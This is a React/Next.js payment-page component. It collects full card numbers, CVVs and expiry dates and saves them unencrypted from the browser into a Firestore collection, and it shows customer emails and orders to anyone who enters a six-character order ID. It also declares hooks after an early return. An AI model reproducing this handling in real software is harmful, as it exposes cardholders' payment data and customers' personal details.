'use client'

import React, { useState, ChangeEvent, FormEvent, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { toast, ToastContainer } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'
import { db } from '../lib/firebase'
import { collection, addDoc } from 'firebase/firestore'

interface FormData {
  orderId: string
  amount: string
  firstName: string
  lastName: string
  cardNumber: string
  cvv: string
  expiryDate: string
  zipCode: string
}

export default function PaymentPage() {
  const [isMounted, setIsMounted] = useState(false)
  const [formData, setFormData] = useState<FormData>({
    orderId: '',
    amount: '',
    firstName: '',
    lastName: '',
    cardNumber: '',
    cvv: '',
    expiryDate: '',
    zipCode: '',
  })
  const [loading] = useState(false);
  const [showModal, setShowModal] = useState(false)

  const [orderData, setOrderData] = useState<any[]>([]);

  const router = useRouter()

  useEffect(() => {
    setIsMounted(true)
  }, [])

  if (!isMounted) return null;

  // const fetchData = async () => {
  //   setLoading(true);
  //   try {
  //     const response = await fetch(`/api/getSubmissions?timestamp=${new Date().getTime()}`);
  //     const data = await response.json();
  //     console.log("data in fetch in zen",data)
  //     if (response.ok) {
  //       const sortedData = (data.submissions || []).sort((a:any, b:any) => {
  //         const dateA = a.createdAt?.seconds ? new Date(a.createdAt.seconds * 1000) : new Date();
  //         const dateB = b.createdAt?.seconds ? new Date(b.createdAt.seconds * 1000) : new Date();
  //         return dateB.getTime() - dateA.getTime();
  //       });

  //       setUserData(sortedData);
  //       console.log("Fetched Data:", sortedData);
  //     } else {
  //       console.error('Error fetching user data:', data.message);
  //     }
  //   } catch (error) {
  //     console.error('Error:', error);
  //   } finally {
  //     setLoading(false);
  //   }
  // };
  const handleChange = async (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === 'expiryDate') {
      // Format expiry date as MM/YY
      const formattedValue = value.replace(/\D/g, '');
      let newValue = formattedValue;

      if (formattedValue.length > 2) {
        newValue = `${formattedValue.slice(0, 2)}/${formattedValue.slice(2, 4)}`;
      }
      setFormData((prevData) => ({ ...prevData, [name]: newValue }));
    } else if (name === 'cardNumber') {
      // Format card number with spaces after every 4 digits
      const formattedValue = value.replace(/\D/g, '').replace(/(.{4})(?=.)/g, '$1 ');
      setFormData((prevData) => ({ ...prevData, [name]: formattedValue }));
    } else if (name === 'orderId') {
      // Format order ID to be alphanumeric only
      const formattedValue = value.replace(/[^a-zA-Z0-9]/g, '');
      console.log("orderId", formattedValue);
      setFormData((prevData) => ({ ...prevData, [name]: formattedValue }));

      if (formattedValue.length === 6) {
        // Fetch data when orderId is exactly 6 characters
        try {
          const response = await fetch(`/api/getSubmissions?orderId=${formattedValue}&timestamp=${new Date().getTime()}`);
          const data = await response.json();

          if (response.ok) {
            const sortedData = (data.submissions || []).sort((a: any, b: any) => {
              const dateA = a.createdAt?.seconds ? new Date(a.createdAt.seconds * 1000) : new Date();
              const dateB = b.createdAt?.seconds ? new Date(b.createdAt.seconds * 1000) : new Date();
              return dateB.getTime() - dateA.getTime();
            });
            setOrderData(sortedData);
            console.log("Fetched Data:", sortedData);
          } else {
            console.error('Error fetching user data:', data.message);
          }
        } catch (error) {
          console.error('Error:', error);
        }
      } else {
        // Clear orderData when orderId is not exactly 6 characters
        setOrderData([]);
      }
    } else {
      // Handle other input fields normally
      setFormData((prevData) => ({ ...prevData, [name]: value }));
    }
  };


  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()

    const currentDate = new Date()
    const [month, year] = formData.expiryDate.split('/')

    if (!month || !year || month.length !== 2 || year.length !== 2) {
      toast.error('Invalid expiry date format. Please use MM/YY.', { position: 'top-center', autoClose: 3000 })
      return
    }

    const expiryMonth = parseInt(month, 10)
    const expiryYear = parseInt(year, 10)

    if (expiryYear < currentDate.getFullYear() % 100) {
      toast.error('Expiry date cannot be in the past.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (expiryYear === currentDate.getFullYear() % 100 && expiryMonth < currentDate.getMonth() + 1) {
      toast.error('Expiry date cannot be in the past.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (/[^A-Za-z ]/.test(formData.firstName)) {
      toast.error('First name must only contain letters and spaces.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (!/^[A-Za-z]+( [A-Za-z]+)?$/.test(formData.lastName)) {
      toast.error('Last name must only contain letters with a single space allowed.', { position: 'top-center', autoClose: 3000 })
      return
    }

    if (!/^[A-Za-z0-9]+$/.test(formData.orderId)) {
      toast.error('Order ID must be alphanumeric.', { position: 'top-center', autoClose: 3000 })
      return
    }

    try {
      await addDoc(collection(db, 'payments'), formData)
      toast.success('Payment will be processed soon!', { position: 'top-center', autoClose: 3000 })

      setFormData({
        orderId: '',
        amount: '',
        firstName: '',
        lastName: '',
        cardNumber: '',
        cvv: '',
        expiryDate: '',
        zipCode: '',
      })

      setShowModal(true)
    } catch (error) {
      console.error('Error adding document: ', error)
      toast.error('Failed to save payment details.', { position: 'top-center', autoClose: 3000 })
    }
  }

  const handleModalClose = () => {
    setShowModal(false)
    router.push('/')
  }

  return (
    <div className="min-h-96 bg-gradient-to-b from-blue-50 to-blue-100 flex flex-col lg:flex-row p-2 lg:p-8">
      {/* Left Section - Payment Form */}
      <div className="bg-white rounded-lg shadow-xl w-full lg:max-w-lg lg:mr-8 mb-4 lg:mb-0">
        <div className="p-6 lg:p-8">
          <h1 className="text-2xl font-bold text-center text-blue-700 mb-2">Payment Details</h1>
          <p className="text-center text-gray-600 mb-6">Enter your payment information securely</p>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label htmlFor="orderId" className="block text-sm font-medium text-gray-700 mb-1">Order ID</label>
                <input
                  type="text"
                  id="orderId"
                  name="orderId"
                  value={formData.orderId}
                  onChange={handleChange}
                  required
                  placeholder="Enter Order ID"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="amount" className="block text-sm font-medium text-gray-700 mb-1">Amount (USD)</label>
                <input
                  type="number"
                  id="amount"
                  name="amount"
                  value={formData.amount}
                  onChange={handleChange}
                  required
                  placeholder="Enter amount in USD"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label htmlFor="firstName" className="block text-sm font-medium text-gray-700 mb-1">First Name</label>
                <input
                  type="text"
                  id="firstName"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleChange}
                  required
                  placeholder="First Name"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="lastName" className="block text-sm font-medium text-gray-700 mb-1">Last Name</label>
                <input
                  type="text"
                  id="lastName"
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleChange}
                  required
                  placeholder="Last Name"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
            </div>
            <div>
              <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                maxLength={19}
                required
                placeholder="1234 5678 9012 3456"
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <div className="grid grid-cols-3 gap-4">
              <div>
                <label htmlFor="expiryDate" className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
                <input
                  type="text"
                  id="expiryDate"
                  name="expiryDate"
                  value={formData.expiryDate}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  required
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
                <input
                  type="text"
                  id="cvv"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleChange}
                  maxLength={3}
                  required
                  placeholder="123"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mb-1">Zip Code</label>
                <input
                  type="text"
                  id="zipCode"
                  name="zipCode"
                  value={formData.zipCode}
                  onChange={handleChange}
                  required
                  placeholder="12345"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
            </div>
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors duration-300"
            >
              Submit Payment
            </button>
          </form>
        </div>
      </div>

      {/* Right Section - Order Details */}
      <div className="bg-white rounded-lg shadow-xl w-full lg:max-w-2xl">
        <div className="border-b border-gray-200 p-6 lg:p-8">
          <h2 className="text-2xl font-semibold text-blue-700">
            Order Details
          </h2>
        </div>

        <div className="p-6 lg:p-8">
          {loading ? (
            <div className="flex items-center justify-center h-40">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-700"></div>
            </div>
          ) : orderData && orderData.length > 0 ? (
            <div className="space-y-6 max-h-96 overflow-y-auto">
              {orderData.map((order, index) => (
                <div
                  key={index}
                  className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-lg p-6 border border-gray-200 transition-all duration-300 hover:shadow-md"
                >
                  <div className="space-y-4">
                    {/* Email Section */}
                    <div className="space-y-1">
                      <h3 className="text-sm font-medium text-gray-500">Customer Email</h3>
                      <p className="text-gray-900 font-medium">{order.email || "Not available"}</p>
                    </div>

                    {/* Order Date Section */}
                    <div className="space-y-1">
                      <h3 className="text-sm font-medium text-gray-500">Order Date</h3>
                      <p className="text-gray-900">
                        {new Date(order.createdAt.seconds * 1000).toLocaleDateString('en-US', {
                          year: 'numeric',
                          month: 'long',
                          day: 'numeric'
                        })}
                      </p>
                    </div>

                    {/* Part Details Section */}
                    <div className="space-y-1">
                      <h3 className="text-sm font-medium text-gray-500">Part Details</h3>
                      <p className="text-gray-900">
                        {order.searchedPartFormatted || "Not available"}
                      </p>
                    </div>

                    {/* Status Badge */}
                    <div className="pt-4 border-t border-gray-200">
                      <span className="inline-flex items-center px-3 py-1 rounded-full text-sm font-medium bg-blue-100 text-blue-800">
                        Processing
                      </span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="flex flex-col items-center justify-center h-40">
              <p className="text-gray-500 text-center">Please Enter Order Id to fetch details</p>
            </div>
          )}
        </div>
      </div>


      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
          <div className="bg-white p-8 rounded-lg text-center shadow-xl max-w-md w-full">
            <h2 className="text-2xl font-semibold text-blue-700 mb-4">Payment Submitted Successfully!</h2>
            <p className="text-gray-600 mb-6">Your Order will be Processed Shortly</p>
            <button
              onClick={handleModalClose}
              className="bg-blue-600 text-white py-2 px-6 rounded-md hover:bg-blue-700 transition duration-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
            >
              Go to Homepage
            </button>
          </div>
        </div>
      )}

      <ToastContainer />
    </div>
  )
}

